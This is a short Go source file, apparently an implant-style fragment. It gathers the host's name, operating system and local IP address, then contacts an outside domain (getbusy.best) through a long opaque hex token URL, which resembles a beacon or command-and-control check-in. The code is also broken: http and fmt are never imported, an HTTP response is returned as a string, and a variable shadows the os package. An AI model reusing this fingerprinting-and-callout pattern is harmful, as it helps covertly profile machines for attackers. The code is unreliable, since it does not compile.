package main

import (
	"os"
    "log"
     "net"
     "runtime"
)

func getHostname() string{
    name, err := os.Hostname()
    if err != nil { 
        panic(err)
    }
    return name
}

func getOS() string{ 
	var os string
	if runtime.GOOS == "windows" {
		os = "Windows"
	}else if runtime.GOOS == "linux" { 
		os = "Linux"
	}
	return os

}

func GetOutboundIP() net.IP {
    conn, err := net.Dial("udp", "8.8.8.8:80")
    if err != nil {
        log.Fatal(err)
    }
    defer conn.Close()

    localAddr := conn.LocalAddr().(*net.UDPAddr)

    return localAddr.IP
}

func GetRealIP() string{
    resp, err := http.Get("http://getbusy.best/c4dd05d6701fc5ab7b7fb5176a4e7c596ee232e9663f3b51a67262ebb0ebcdb784b9c502ff20916eae766069b17a6882728866e8e554334ca8769af22d036d89aaf58d450ef9e90199f7de241e9871f97d96fe41a9be8122b959e141d087d226")
    if err != nil {
        fmt.Println("could not reach destination")
        return ""
    }
    return resp
}